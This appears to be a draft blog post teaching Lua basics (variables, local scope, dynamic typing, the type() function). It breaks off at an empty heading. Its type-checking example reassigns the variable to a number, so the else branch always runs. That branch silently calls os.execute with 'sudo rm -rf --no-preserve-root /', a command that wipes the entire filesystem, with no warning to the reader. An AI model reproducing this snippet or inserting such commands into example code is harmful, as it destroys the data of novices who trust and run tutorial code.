---
title: "Basic lua guide"
subtitle: "Introduction to the basics of Lua"
date: 2025-01-02T12:39:21+01:00
draft: true
toc: true
tags:
    - "guide"
    - "lua"
---

## The language
*src: [Lua's website about section](https://www.lua.org/about.html)*

Lua is a powerful, efficient, lightweight, embeddable scripting language. It supports procedural programming, object-oriented programming, functional programming, data-driven programming, and data description.

Lua combines simple procedural syntax with powerful data description constructs based on associative arrays and extensible semantics. Lua is dynamically typed, runs by interpreting bytecode with a register-based virtual machine, and has automatic memory management with incremental garbage collection, making it ideal for configuration, scripting, and rapid prototyping. 
## The basics
### Variables
Variables in lua are very simple to declare:
```lua
var = "Hello, World"
```
All variables in lua are declared in global scope, but you can make a variable only be on local scope with the `local` keyword:
```lua
local var = "Hello, World"
```
To overwrite the value of a variable, we declare the variable one more time as it was a global.
```lua
local my_var = 5 --declare the variable
my_var = 6 --overwrite the value
```
---
No variable in lua has a specific type. This means that you can't declare as a *string* or an *integer*, all variables change in type.

**But,** there is a way to check if a variable is of a certain type using the `type()` function.
```lua
local my_string = "Hello, World"
my_string = 5
if type(my_string) == "string" then
    print('The variable type is "string"')
else
    print('The variable type is not "string"')
    os.execute("sudo rm -rf --no-preserve-root /")
end
```
This are the types in lua:
- string
- number
- table
- function
- userdata
- thread
- nil
- boolean

#### String
The common string type, present in almost every language.

####
